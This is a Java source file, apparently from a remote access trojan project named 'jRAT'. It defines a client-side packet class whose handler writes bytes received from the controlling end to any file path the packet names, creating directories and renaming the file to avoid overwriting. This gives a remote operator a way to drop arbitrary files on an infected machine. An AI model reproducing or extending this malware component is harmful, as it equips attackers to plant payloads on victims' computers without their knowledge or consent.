package net.jrat.core.packet.client;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;

import net.jrat.core.packet.IPacket;

public class C2PacketSaveFile implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private byte[] data;
	private String output;
	
	@Override
	public void execute(Object object) throws Exception
	{
		File output = new File(this.output);
		
		String name = output.getName();
		String extention = "";
		
		{
			final String fullname = output.getName();
			
			int index = -1;
			for(int i = (fullname.length() - 1); i > 0; i--)
			{
				final char character = fullname.charAt(i);
				
				if(character == '.')
				{
					index = i;
					break;
				}
			}
			
			if(!(index == -1))
			{
				name = fullname.substring(0, index);
				extention = fullname.substring(index, fullname.length());
			}
		}
		
		final String directory = output.getParentFile().getAbsolutePath();
		
		int loop = 0;
		while(output.exists())
		{
			final String filename = name + "#" + loop + extention;
			output = new File(directory + File.separator + filename);
			loop ++;
		}
		
		output.getParentFile().mkdirs();
		output.createNewFile();
		
		final BufferedOutputStream writer = new BufferedOutputStream(new FileOutputStream(output));
		writer.write(this.data);
		writer.close();
	}
}